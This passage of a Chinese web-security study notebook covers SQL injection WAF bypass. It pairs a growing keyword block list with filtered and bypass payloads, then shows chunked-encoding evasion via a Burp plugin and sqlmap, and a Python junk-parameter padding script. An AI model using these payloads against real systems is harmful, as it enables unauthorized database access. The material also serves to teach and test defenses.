+<pre><code>waf = &apos;and|or&apos;
+&#x8FC7;&#x6EE4;&#x4EE3;&#x7801; 1 or 1=1   1 and 1=1
+&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F; 1 || 1=1   1 &amp;&amp; 1=1
+</code></pre><h4 id="&#x8FC7;&#x6EE4;union"><a name="&#x8FC7;&#x6EE4;union" class="anchor-navigation-ex-anchor" href="#&#x8FC7;&#x6EE4;union"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8FC7;&#x6EE4;union" class="plugin-anchor" href="#&#x8FC7;&#x6EE4;union"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8FC7;&#x6EE4;union</h4>
+<pre><code>waf = &apos;and|or|union&apos;
+&#x8FC7;&#x6EE4;&#x4EE3;&#x7801; union select user,password from users
+&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F; 1 &amp;&amp; (select user from users where userid=1)=&apos;admin&apos;
+</code></pre><h4 id="&#x8FC7;&#x6EE4;where"><a name="&#x8FC7;&#x6EE4;where" class="anchor-navigation-ex-anchor" href="#&#x8FC7;&#x6EE4;where"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8FC7;&#x6EE4;where" class="plugin-anchor" href="#&#x8FC7;&#x6EE4;where"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8FC7;&#x6EE4;where</h4>
+<pre><code>waf = &apos;and|or|union|where&apos;
+&#x8FC7;&#x6EE4;&#x4EE3;&#x7801; 1 &amp;&amp; (select user from users where user_id = 1) = &apos;admin&apos;
+&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F; 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos;
+</code></pre><h4 id="&#x8FC7;&#x6EE4;limit"><a name="&#x8FC7;&#x6EE4;limit" class="anchor-navigation-ex-anchor" href="#&#x8FC7;&#x6EE4;limit"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8FC7;&#x6EE4;limit" class="plugin-anchor" href="#&#x8FC7;&#x6EE4;limit"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8FC7;&#x6EE4;limit</h4>
+<pre><code>waf = &apos;and|or|union|where|limit&apos;
+&#x8FC7;&#x6EE4;&#x4EE3;&#x7801; 1 &amp;&amp; (select user from users limit 1) = &apos;admin&apos;
+&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F; 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos;#user_id&#x805A;&#x5408;&#x4E2D;user_id&#x4E3A;1&#x7684;user&#x4E3A;admin
+</code></pre><h4 id="&#x8FC7;&#x6EE4;group-by"><a name="&#x8FC7;&#x6EE4;group-by" class="anchor-navigation-ex-anchor" href="#&#x8FC7;&#x6EE4;group-by"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8FC7;&#x6EE4;group-by" class="plugin-anchor" href="#&#x8FC7;&#x6EE4;group-by"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8FC7;&#x6EE4;group by</h4>
+<pre><code>waf = &apos;and|or|union|where|limit|group by&apos;
+&#x8FC7;&#x6EE4;&#x4EE3;&#x7801; 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &apos;admin&apos;
+&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F; 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1
+</code></pre><h4 id="&#x8FC7;&#x6EE4;select"><a name="&#x8FC7;&#x6EE4;select" class="anchor-navigation-ex-anchor" href="#&#x8FC7;&#x6EE4;select"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8FC7;&#x6EE4;select" class="plugin-anchor" href="#&#x8FC7;&#x6EE4;select"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8FC7;&#x6EE4;select</h4>
+<pre><code>waf = &apos;and|or|union|where|limit|group by|select&apos;
+&#x8FC7;&#x6EE4;&#x4EE3;&#x7801; 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1
+&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F; 1 &amp;&amp; substr(user,1,1) = &apos;a&apos;
+</code></pre><h4 id="&#x8FC7;&#x6EE4;&#x5355;&#x5F15;&#x53F7;"><a name="&#x8FC7;&#x6EE4;&#x5355;&#x5F15;&#x53F7;" class="anchor-navigation-ex-anchor" href="#&#x8FC7;&#x6EE4;&#x5355;&#x5F15;&#x53F7;"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8FC7;&#x6EE4;&#x5355;&#x5F15;&#x53F7;" class="plugin-anchor" href="#&#x8FC7;&#x6EE4;&#x5355;&#x5F15;&#x53F7;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8FC7;&#x6EE4;&#x2019;(&#x5355;&#x5F15;&#x53F7;)</h4>
+<pre><code>waf = &apos;and|or|union|where|limit|group by|select|\&apos;&apos;
+&#x8FC7;&#x6EE4;&#x4EE3;&#x7801; 1 &amp;&amp; substr(user,1,1) = &apos;a&apos;
+&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F; 1 &amp;&amp; user_id is not null    1 &amp;&amp; substr(user,1,1) = 0x61    1 &amp;&amp; substr(user,1,1) = unhex(61)
+</code></pre><h4 id="&#x8FC7;&#x6EE4;hex"><a name="&#x8FC7;&#x6EE4;hex" class="anchor-navigation-ex-anchor" href="#&#x8FC7;&#x6EE4;hex"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8FC7;&#x6EE4;hex" class="plugin-anchor" href="#&#x8FC7;&#x6EE4;hex"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8FC7;&#x6EE4;hex</h4>
+<pre><code>waf = &apos;and|or|union|where|limit|group by|select|\&apos;|hex&apos;
+&#x8FC7;&#x6EE4;&#x4EE3;&#x7801; 1 &amp;&amp; substr(user,1,1) = unhex(61)
+&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F; 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #&#x5341;&#x8FDB;&#x5236;&#x7684;11&#x8F6C;&#x5316;&#x4E3A;&#x5341;&#x516D;&#x8FDB;&#x5236;&#xFF0C;&#x5E76;&#x5C0F;&#x5199;&#x3002;
+</code></pre><h4 id="&#x8FC7;&#x6EE4;substr"><a name="&#x8FC7;&#x6EE4;substr" class="anchor-navigation-ex-anchor" href="#&#x8FC7;&#x6EE4;substr"><i class="fa fa-link" aria-hidden="true"></i></a><a name="&#x8FC7;&#x6EE4;substr" class="plugin-anchor" href="#&#x8FC7;&#x6EE4;substr"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8FC7;&#x6EE4;substr</h4>
+<pre><code>waf = &apos;and|or|union|where|limit|group by|select|\&apos;|hex|substr&apos;
+&#x8FC7;&#x6EE4;&#x4EE3;&#x7801; 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) 
+&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F; 1 &amp;&amp; lpad(user(),1,1) in &apos;r&apos;
+</code></pre><h2 id="&#x5206;&#x6BB5;&#x4F20;&#x8F93;&#x8FC7;waf"><a name="&#x5206;&#x6BB5;&#x4F20;&#x8F93;&#x8FC7;waf" class="anchor-navigation-ex-anchor" href="#&#x5206;&#x6BB5;&#x4F20;&#x8F93;&#x8FC7;waf"><i class="fa fa-link" aria-hidden="true"></i></a>1.13. &#x5206;&#x6BB5;&#x4F20;&#x8F93;&#x8FC7;WAF</h2>
+<p>&#x4F7F;&#x7528;burp&#x63D2;&#x4EF6;&#xFF0C;&#x63D2;&#x4EF6;Github&#x5730;&#x5740;&#x4E3A;:<a href="https://github.com/c0ny1/chunked-coding-converter" target="_blank">https://github.com/c0ny1/chunked-coding-converter</a></p>
+<p>&#x5728;burp&#x5B89;&#x88C5;&#x5B8C;&#x63D2;&#x4EF6;&#x540E;&#xFF0C;&#x76F4;&#x63A5;&#x53F3;&#x952E;&#x9009;&#x62E9;chunked codingconverter&#x7F16;&#x7801;</p>
+<p><img src="http://picbed.easy233.top//imgimage-20201018155350039.png" alt="image-20201018155350039"></p>
+<p>&#x642D;&#x914D;Sqlmap&#x8DD1;&#x6CE8;&#x5165;&#xFF1A;</p>
+<p>&#x9009;&#x62E9;Config&#x4E2D;&#x7684;proxy</p>
+<p><img src="http://picbed.easy233.top//imgimage-20201018160214171.png" alt="image-20201018160214171"></p>
+<p>&#x7136;&#x540E;sqlmap&#x6267;&#x884C;&#x547D;&#x4EE4;<code>sqlmap.py -r 1.txt --batch --proxy=http://127.0.0.1:8080 --dbs</code></p>
+<p><img src="http://picbed.easy233.top//imgimage-20201018160317527.png" alt="image-20201018160317527"></p>
+<h2 id="&#x586B;&#x5145;&#x5783;&#x573E;&#x6570;&#x636E;&#x8FC7;waf"><a name="&#x586B;&#x5145;&#x5783;&#x573E;&#x6570;&#x636E;&#x8FC7;waf" class="anchor-navigation-ex-anchor" href="#&#x586B;&#x5145;&#x5783;&#x573E;&#x6570;&#x636E;&#x8FC7;waf"><i class="fa fa-link" aria-hidden="true"></i></a>1.14. &#x586B;&#x5145;&#x5783;&#x573E;&#x6570;&#x636E;&#x8FC7;WAF</h2>
+<p>&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;&#x811A;&#x672C;&#x751F;&#x6210;&#x5783;&#x573E;&#x6570;&#x636E;&#xFF0C;&#x5783;&#x573E;&#x6570;&#x636E;&#x653E;&#x5230;&#x8981;&#x6CE8;&#x5165;&#x7684;&#x5B57;&#x6BB5;&#x524D;&#x540E;</p>
+<pre><code class="lang-python">
+<span class="hljs-comment">#coding=utf-8</span>
+<span class="hljs-keyword">import</span> random,string
+<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse
+varname_min = <span class="hljs-number">5</span>
+varname_max = <span class="hljs-number">15</span>
+data_min = <span class="hljs-number">20</span>
+data_max = <span class="hljs-number">25</span>
+num_min = <span class="hljs-number">50</span>
+num_max = <span class="hljs-number">100</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randstr</span><span class="hljs-params">(length)</span>:</span>
+  str_list = [random.choice(string.ascii_letters) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(length)]
+  random_str = <span class="hljs-string">&apos;&apos;</span>.join(str_list)
+  <span class="hljs-keyword">return</span> random_str
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
+  data={}
+  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(num_min,num_max):
+    data[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))
+  print(<span class="hljs-string">&apos;&amp;&apos;</span>+parse.urlencode(data)+<span class="hljs-string">&apos;&amp;&apos;</span>)
+main()
+</code></pre>
+<h2 id="&#x63A8;&#x8350;&#x9605;&#x8BFB;&#x6587;&#x7AE0;"><a name="&#x63A8;&#x8350;&#x9605;&#x8BFB;&#x6587;&#x7AE0;" class="anchor-navigation-ex-anchor" href="#&#x63A8;&#x8350;&#x9605;&#x8BFB;&#x6587;&#x7AE0;"><i class="fa fa-link" aria-hidden="true"></i></a>1.15. &#x63A8;&#x8350;&#x9605;&#x8BFB;&#x6587;&#x7AE0;</h2>
+<p><a href="https://www.smi1e.top/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/#i-2" target="_blank">Sql&#x6CE8;&#x5165;&#x7B14;&#x8BB0;</a></p>
+<p><a href="https://paper.seebug.org/218/" target="_blank">&#x6211;&#x7684;WafBypass&#x4E4B;&#x9053;&#xFF08;SQL&#x6CE8;&#x5165;&#x7BC7;&#xFF09;</a></p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="sql注入基础.html" class="navigation navigation-prev " aria-label="Previous page: sql注入基础">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="Sqlmap使用教程.html" class="navigation navigation-next " aria-label="Next page: sqlmap使用教程">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"sql注入的技巧","level":"2.1.2","depth":2,"next":{"title":"sqlmap使用教程","level":"2.1.3","depth":2,"path":"web安全基础总结/sql/Sqlmap使用教程.md","ref":"web安全基础总结/sql/Sqlmap使用教程.md","articles":[]},"previous":{"title":"sql注入基础","level":"2.1.1","depth":2,"path":"web安全基础总结/sql/sql注入基础.md","ref":"web安全基础总结/sql/sql注入基础.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-search","search-pro","-sharing","splitter","anchors","expandable-chapters-small","toggle-chapters","chapter-fold","donate","sharing-plus","anchor-navigation-ex","favicon","copy-code-button","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"chapter-fold":{},"livereload":{},"splitter":{},"search-pro":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"donate":{"alipay":"http://picbed.easy233.top//img20201018212824.png","alipayText":"支付宝打赏","button":"打赏作者","title":"","wechat":"http://picbed.easy233.top//img20201018212856.png","wechatText":"微信打赏"},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":true,"float":{"floatIcon":"fa fa-navicon","level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":true},"favicon":{},"expandable-chapters-small":{},"copy-code-button":{},"sharing":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"toggle-chapters":{}},"theme":"default","author":"EASY","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"WEB安全知识总结","language":"zh-hans","links":{"sidebar":{"Home":"https://www.easy233.top/"}},"gitbook":"3.2.3","description":"系统总结自已web安全学习知识","theme-default":{"showLevel":true}},"file":{"path":"web安全基础总结/sql/sql注入的技巧.md","mtime":"2020-10-18T08:22:51.800Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-10-19T08:41:44.735Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-expandable-chapters-small/expandable-chapters-small.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-toggle-chapters/toggle.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
